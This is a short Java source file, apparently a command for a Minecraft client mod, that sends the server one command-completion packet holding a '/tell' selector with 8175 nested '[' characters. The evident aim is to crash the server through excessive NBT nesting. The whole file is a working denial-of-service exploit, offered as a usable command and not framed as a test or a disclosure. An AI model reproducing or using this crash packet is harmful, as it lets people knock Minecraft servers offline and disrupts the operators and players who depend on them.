package skid.supreme.blon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class CommandCompleteCrash extends Command {
    public CommandCompleteCrash() {
        super("commandcrash", "");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/tell @a[nbt={a:" + "[".repeat(8175)));
            return SINGLE_SUCCESS;
        });
    }
}
